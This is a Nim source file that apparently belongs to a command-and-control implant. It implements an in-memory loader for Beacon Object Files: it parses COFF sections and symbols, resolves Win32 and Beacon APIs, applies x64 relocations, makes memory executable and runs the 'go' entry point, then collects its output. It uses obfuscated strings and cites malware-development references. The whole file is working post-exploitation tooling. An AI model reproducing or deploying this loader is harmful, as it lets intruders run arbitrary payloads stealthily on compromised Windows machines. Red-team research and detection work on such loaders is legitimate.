import winim/lean
import strformat, strutils, ptr_math
import ./[beacon, io]
import ../../../common/utils

#[
    Object file loading involves the following steps
    1. Calculate and allocate memory required to hold the object file sections and symbols
    2. Copy option sections into the newly allocated memory
    3. Parse and resolve function symbols 
    4. Perform section relocations 
    5. Change memory protection and execute the entry point function

    References: 
    - https://maldevacademy.com/new/modules/51
    - https://github.com/trustedsec/COFFLoader/blob/main/COFFLoader.c
    - https://github.com/m4ul3r/malware/blob/main/nim/coff_loader/main.nim
    - https://github.com/frkngksl/NiCOFF/blob/main/Main.nim 
]#

# Type definitions
type 
    SECTION_MAP = object
        base: PVOID
        size: ULONG

    PSECTION_MAP = ptr SECTION_MAP

    OBJECT_CTX_UNION {.union.} = object 
        base: ULONG_PTR
        header: PIMAGE_FILE_HEADER

    OBJECT_CTX {.pure.} = object 
        union: OBJECT_CTX_UNION
        symTbl: PIMAGE_SYMBOL 
        symMap: ptr PVOID 
        secMap: PSECTION_MAP
        sections: PIMAGE_SECTION_HEADER

    POBJECT_CTX = ptr OBJECT_CTX

    # For entry point execution
    EntryPoint = proc(args: PBYTE, argc: ULONG): void {.stdcall.}

# Macro for page alignment ( important for calculating the total virtual memory required for the object file to be loaded and executed)
# #define PAGE_ALIGN( x ) (((ULONG_PTR)x) + ((SIZE_OF_PAGE - (((ULONG_PTR)x) & (SIZE_OF_PAGE - 1))) % SIZE_OF_PAGE))
const PAGE_SIZE = 0x1000
template PAGE_ALIGN(address: auto): uint = 
    cast[uint](address) + ((PAGE_SIZE - (cast[uint](address) and (PAGE_SIZE - 1))) mod PAGE_SIZE)

#[
    Calculates required memory size 
]#
proc objectVirtualSize(objCtx: POBJECT_CTX): ULONG = 
    var 
        objRel: PIMAGE_RELOCATION
        objSym: PIMAGE_SYMBOL 
        symbol: PSTR
        length: ULONG

    var sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](objCtx.sections)

    # Calculate size of the sections
    for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
        length += ULONG(PAGE_ALIGN(sections[i].SizeOfRawData))

    # Calculate function map size 
    for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
        objRel = cast[PIMAGE_RELOCATION](objCtx.union.base + sections[i].PointerToRelocations)

        # Iterate over section relocations to retrieve symbols
        for j in 0 ..< int(sections[i].NumberOfRelocations): 
            objSym = cast[PIMAGE_SYMBOL](cast[uint](objCtx.symTbl) + (cast[uint](objRel.SymbolTableIndex) * uint(sizeof(IMAGE_SYMBOL))))
            # dump objSym.repr

            # Retrieve symbol name
            if objSym.N.Name.Short != 0: 
                # Short name
                symbol = cast[PSTR](addr objSym.N.ShortName)
            else: 
                symbol = cast[PSTR]((cast[uint](objCtx.symTbl) + uint(objCtx.union.header.NumberOfSymbols) * uint(sizeof(IMAGE_SYMBOL))) + cast[uint](objSym.N.Name.Long))

            # Check if symbol starts with `__ipm_` (imported functions)
            if ($symbol).startsWith("__imp_"): 
                length += ULONG(sizeof(PVOID))

            # Handle next relocation item/symbol
            objRel = cast[PIMAGE_RELOCATION](cast[uint](objRel) + uint(sizeof(IMAGE_RELOCATION)))

    return ULONG(PAGE_ALIGN(length))

#[
    Symbol resolution
]#
proc getSymbolName(objSym: PIMAGE_SYMBOL, stringTable: PCHAR): string =
    if objSym.N.Name.Short != 0:
        # Short name
        var nameBuf: array[9, char]
        copyMem(addr nameBuf[0], addr objSym.N.ShortName[0], 8)
        nameBuf[8] = '\0'
        return $cast[cstring](addr nameBuf[0])
    else:
        # Long name
        return $(cast[cstring](stringTable + objSym.N.Name.Long))

proc strchr*(str: pointer, c: char): pointer =
    var pStr = cast[ptr char](str)
    while (pStr[] != '\0') and (pStr[] != c):
        pStr = cast[ptr char](cast[uint](pStr) + 1)

    if pStr[] == c:
        return cast[pointer](pStr)
    else:
        return nil

proc objectResolveSymbol(symbol: var PSTR, stringTable: PCHAR): PVOID = 
    var 
        resolved: PVOID 
        function: PSTR 
        library: PSTR 
        pos: PCHAR 
        buffer: array[MAX_PATH, char]
        hModule: HANDLE

    if symbol == nil:
        raise newException(CatchableError, protect("Symbol is nil."))

    let fullSymbol = $symbol
    
    # Check for internal Beacon functions
    if fullSymbol.startsWith("__imp_Beacon") or 
       fullSymbol.startsWith("__imp_toWideChar") or
       fullSymbol.startsWith("__imp_LoadLibraryA") or
       fullSymbol.startsWith("__imp_GetProcAddress") or
       fullSymbol.startsWith("__imp_GetModuleHandleA") or
       fullSymbol.startsWith("__imp_FreeLibrary"):
        
        let funcName = fullSymbol[6..^1]
        
        for i in 0 ..< beaconApiAddresses.len(): 
            if funcName == beaconApiAddresses[i].name: 
                resolved = beaconApiAddresses[i].address
                print fmt"    [>] {funcName} @ 0x{resolved.repr}"
                return resolved
        
        raise newException(CatchableError, fmt"Failed to resolve internal symbol: {funcName}")
    
    # Remove __imp_ prefix for external symbols
    symbol = cast[PSTR](cast[uint](symbol) + 6)
    
    # External Win32 APIs use the following format: LIBRARY$Function
    zeroMem(addr buffer[0], MAX_PATH)
    copyMem(addr buffer[0], symbol, ($symbol).len())

    pos = cast[PSTR](strchr(addr buffer[0], '$'))
    if pos == nil:
        raise newException(CatchableError, fmt"Invalid external symbol format: {$symbol}")
    pos[] = '\0' 

    library = cast[PSTR](addr buffer[0]) 
    function = cast[PSTR](cast[uint](pos) + 1)

    # Resolve the library instance 
    hModule = GetModuleHandleA(library)
    if hModule == 0:
        hModule = LoadLibraryA(library)
        if hModule == 0: 
            raise newException(CatchableError, fmt"Failed to load library {$library}: " & GetLastError().getError())

    # Resolve the function from the loaded library 
    resolved = GetProcAddress(hModule, function)
    if resolved == nil: 
        raise newException(CatchableError, fmt"Failed to resolve {$function} from {$library}: " & GetLastError().getError())

    print fmt"    [>] {$library}${$function} @ 0x{resolved.repr}"
    RtlSecureZeroMemory(addr buffer[0], sizeof(buffer))
    return resolved

#[
    Object relocation
    Arguments: 
    - uType: Type of relocation to perform
    - pRelocAddress: Address where the relocation will be applied
    - pSecBase: Base address of the section in the newly allocated object file, where the relocation needs to occur
]#
proc objectRelocation(uType: ULONG, pRelocAddress: PVOID, pSecBase: PVOID) =
    case(uType)
    of IMAGE_REL_AMD64_ADDR64:
        cast[PUINT64](pRelocAddress)[] = cast[UINT64](cast[uint](cast[PUINT64](pRelocAddress)[]) + cast[uint](pSecBase))
    of IMAGE_REL_AMD64_ADDR32NB:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](pSecBase) - (cast[uint](pRelocAddress) + 4))
    of IMAGE_REL_AMD64_REL32:
       cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32)
    of IMAGE_REL_AMD64_REL32_1:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 1)
    of IMAGE_REL_AMD64_REL32_2:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 2)
    of IMAGE_REL_AMD64_REL32_3:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 3)
    of IMAGE_REL_AMD64_REL32_4:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 4)
    of IMAGE_REL_AMD64_REL32_5:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 5)
    else: discard

#[
    Section processing
]#
proc objectProcessSection(objCtx: POBJECT_CTX) =
    var 
        secBase: PVOID 
        objRel: PIMAGE_RELOCATION
        objSym: PIMAGE_SYMBOL
        symbol: PSTR 
        resolved: PVOID 
        reloc: PVOID 
        fnIndex: ULONG

    var 
        sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](objCtx.sections)
        secMap = cast[ptr UncheckedArray[SECTION_MAP]](objCtx.secMap)
        symMap = cast[ptr UncheckedArray[PVOID]](objCtx.symMap)
    
    # Calculate string table location
    let stringTable = cast[PCHAR](cast[uint](objCtx.symTbl) + uint(objCtx.union.header.NumberOfSymbols) * uint(sizeof(IMAGE_SYMBOL)))

    # Process and relocate object file sections
    for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
        objRel = cast[PIMAGE_RELOCATION](objCtx.union.base + sections[i].PointerToRelocations)

        # Iterate over section relocations to retrieve symbols
        for j in 0 ..< int(sections[i].NumberOfRelocations): 
            objSym = cast[PIMAGE_SYMBOL](cast[uint](objCtx.symTbl) + (cast[uint](objRel.SymbolTableIndex) * uint(sizeof(IMAGE_SYMBOL))))

            let symName = getSymbolName(objSym, stringTable)
            symbol = cast[PSTR](unsafeAddr symName[0])

            # Retrieve address to perform relocation
            reloc = cast[PVOID](cast[uint](secMap[i].base) + uint(objRel.union1.VirtualAddress))
            resolved = nil 

            # Check if symbol starts with `__imp_` (imported functions)
            if symName.startsWith("__imp_"):
                resolved = objectResolveSymbol(symbol, stringTable)
            
            # Perform relocation on the imported function 
            if (objRel.Type == IMAGE_REL_AMD64_REL32 or 
                objRel.Type == IMAGE_REL_AMD64_REL32_1 or
                objRel.Type == IMAGE_REL_AMD64_REL32_2 or
                objRel.Type == IMAGE_REL_AMD64_REL32_3 or
                objRel.Type == IMAGE_REL_AMD64_REL32_4 or
                objRel.Type == IMAGE_REL_AMD64_REL32_5) and (resolved != nil): 
                symMap[fnIndex] = resolved 
                
                let adjustment = case objRel.Type
                    of IMAGE_REL_AMD64_REL32_1: 1
                    of IMAGE_REL_AMD64_REL32_2: 2
                    of IMAGE_REL_AMD64_REL32_3: 3
                    of IMAGE_REL_AMD64_REL32_4: 4
                    of IMAGE_REL_AMD64_REL32_5: 5
                    else: 0
                
                cast[PUINT32](reloc)[] = cast[UINT32]((cast[uint](objCtx.symMap) + uint(fnIndex) * uint(sizeof(PVOID))) - cast[uint](reloc) - uint(sizeof(uint32)) - uint(adjustment))
                inc fnIndex
            else: 
                secBase = secMap[objSym.SectionNumber - 1].base
                
                # Perform relocation on the section
                objectRelocation(cast[ULONG](objRel.Type), reloc, secBase)

            # Handle next relocation item/symbol
            objRel = cast[PIMAGE_RELOCATION](cast[uint](objRel) + uint(sizeof(IMAGE_RELOCATION)))

#[
    Object file execution
    Arguments: 
    - objCtx: Object context
    - entry: Name of the entry function to be executed
    - args: Arguments passed to the object file
]#
proc objectExecute(objCtx: POBJECT_CTX, entry: PSTR, args: seq[byte]) =
    var 
        objSym: PIMAGE_SYMBOL
        secBase: PVOID 
        secSize: ULONG 
        oldProtect: ULONG 

    var secMap = cast[ptr UncheckedArray[SECTION_MAP]](objCtx.secMap)
    
    # Calculate string table
    let stringTable = cast[PCHAR](cast[uint](objCtx.symTbl) + uint(objCtx.union.header.NumberOfSymbols) * uint(sizeof(IMAGE_SYMBOL)))

    for i in 0 ..< int(objCtx.union.header.NumberOfSymbols): 
        objSym = cast[PIMAGE_SYMBOL](cast[uint](objCtx.symTbl) + (uint(i) * uint(sizeof(IMAGE_SYMBOL))))
        
        let symName = getSymbolName(objSym, stringTable)

        # Check if the function is defined within the object file 
        if ISFCN(objSym.Type) and (symName == $entry): 
            secBase = secMap[objSym.SectionNumber - 1].base 
            secSize = secMap[objSym.SectionNumber - 1].size

            # Change the memory protection from [RW-] to [R-X]
            if VirtualProtect(secBase, secSize, PAGE_EXECUTE_READ, addr oldProtect) == 0: 
                raise newException(CatchableError, GetLastError().getError())

            # Execute BOF entry point 
            var entryPoint = cast[EntryPoint](cast[uint](secBase) + cast[uint](objSym.Value))

            if args.len > 0:
                entryPoint(addr args[0], cast[ULONG](args.len()))
            else: 
                entryPoint(nil, 0)

            if VirtualProtect(secBase, secSize, oldProtect, addr oldProtect) == 0:
                raise newException(CatchableError, GetLastError().getError())

            return

    raise newException(CatchableError, fmt"Failed to find entry function: {$entry}")

#[
    Loads, parses and executes a object file in memory

    Arguments:
    - objectFile: Bytes of the object file
    - args: Bytes of the COFF arguments
    - entryFunction: Name of the entry function to look for, usually "go"
]#
proc inlineExecute*(objectFile: seq[byte], args: seq[byte] = @[], entryFunction: string = "go") =
    var 
        objCtx: OBJECT_CTX
        virtSize: ULONG
        virtAddr: PVOID 
        secSize: ULONG
        secBase: PVOID 

    var pObject = unsafeAddr objectFile[0]
    if pObject == nil or entryFunction == "": 
        raise newException(CatchableError, protect("Missing required arguments."))

    objCtx.union.header = cast[PIMAGE_FILE_HEADER](pObject)
    objCtx.symTbl       = cast[PIMAGE_SYMBOL](cast[uint](pObject) + cast[uint](objCtx.union.header.PointerToSymbolTable))
    objCtx.sections     = cast[PIMAGE_SECTION_HEADER](cast[uint](pObject) + uint(sizeof(IMAGE_FILE_HEADER)))

    # print objCtx.union.header.repr
    # print objCtx.symTbl.repr
    # print objCtx.sections.repr

    # Verifying that the object file's architecture is x64
    when defined(amd64): 
        if objCtx.union.header.Machine != IMAGE_FILE_MACHINE_AMD64: 
            RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
            raise newException(CatchableError, protect("Only x64 object files are supported."))
    else: 
        RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
        raise newException(CatchableError, protect("Only x64 object files are supported."))

    # Calculate required virtual memory
    virtSize = objectVirtualSize(addr objCtx)
    print fmt"[*] Virtual size of object file: {virtSize} bytes"

    virtAddr = VirtualAlloc(nil, virtSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
    if virtAddr == nil: 
        RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
        raise newException(CatchableError, GetLastError().getError())
    defer: VirtualFree(virtAddr, 0, MEM_RELEASE)

    objCtx.secMap = cast[PSECTION_MAP](HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, int(objCtx.union.header.NumberOfSections) * sizeof(SECTION_MAP)))
    if objCtx.secMap == nil: 
        RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
        raise newException(CatchableError, GetLastError().getError())
    defer: HeapFree(GetProcessHeap(), 0, objCtx.secMap)

    print fmt"[*] Virtual memory allocated for object file at 0x{virtAddr.repr} ({virtSize} bytes)"
    
    # Set the section base to the allocated memory
    secBase = virtAddr

    # Copy over sections into the newly allocated virtual memory
    var sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](objCtx.sections)
    var secMap = cast[ptr UncheckedArray[SECTION_MAP]](objCtx.secMap)

    print protect("[*] Copying over sections.")
    for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
        secSize = sections[i].SizeOfRawData
        secMap[i].size = secSize
        secMap[i].base = secBase

        # Copy over section data
        copyMem(secBase, cast[PVOID](uint(objCtx.union.base) + cast[uint](sections[i].PointerToRawData)), secSize)
        print fmt"    [>] {$(addr sections[i].Name)} @ 0x{secBase.repr} ({secSize} bytes))"

        # Get the next page entry
        secBase = cast[PVOID](PAGE_ALIGN(cast[uint](secBase) + uint(secSize)))

    # The last page of the memory is the symbol/function map
    objCtx.symMap = cast[ptr PVOID](secBase)

    print protect("[*] Processing sections and performing relocations.")
    objectProcessSection(addr objCtx)

    # Executing the object file
    print protect("[*] Executing.")
    objectExecute(addr objCtx, entryFunction, args)
    print protect("[+] Object file executed successfully.")

    RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))

#[ 
    Execute a object file in memory and retrieve the output using the BeaconGetOutputData API
    Arguments:
    - objectFile: Bytes of the object file
    - args: Bytes of the COFF arguments
    - entryFunction: Name of the entry function to look for, usually "go"
]#
proc inlineExecuteGetOutput*(objectFile: seq[byte], args: seq[byte] = @[], entryFunction: string = "go"): string =
    inlineExecute(objectFile, args, entryFunction)

    var outSize: int = 0
    var output = BeaconGetOutputData(addr outSize)
    
    if output != nil and outSize > 0:
        result = newString(outSize)
        copyMem(addr result[0], output, outSize)
        discard HeapFree(GetProcessHeap(), 0, output)
    else:
        raise newException(CatchableError, protect("Failed to get output."))